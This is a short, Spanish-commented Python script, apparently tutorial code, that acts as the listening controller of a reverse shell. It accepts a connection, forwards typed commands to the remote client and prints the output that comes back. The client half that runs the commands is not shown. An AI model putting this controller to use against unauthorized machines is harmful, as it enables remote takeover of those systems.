#Librerías necesarias.
import socket

SERVER_HOST = '127.0.0.1'
SERVER_PORT = 5003
BUFFER_SIZE = 1024 #Envía 1kb (Tamaño del buffer).

#Se crea un objeto de tipo socket.
skt = socket.socket()

#Se enlaza el socket con la dirección.
skt.bind((SERVER_HOST, SERVER_PORT))

#Se permiten las conexiones (10).
skt.listen(10)
print(f'Listening as {SERVER_HOST}:{SERVER_PORT}...')

#Se acepta cualquier conexión.
client_socket, client_address = skt.accept()
print(f'{client_address[0]}:{client_address[1]} Connected!')

#Enviando un mensaje.
message = 'Hello and walcome'.encode()
client_socket.send(message)

#Bucle infinito.
while True:
    #Obtenemos el comando desde el prompt.
    command = input('Enter the command you wanna execute: ')

    #Se envía el comando al cliente.
    client_socket.send(command.encode())

    if command.lower() == 'exit': #Salimos del bucle.
        break

    #Se recuperan los resultados del comando.
    results = client_socket.recv(BUFFER_SIZE).decode()

    #Se imprimen los resultados.
    print(results)

#Se cierra la conexión con el cliente.
client_socket.close()

#Se cierra el socket servidor.
skt.close()
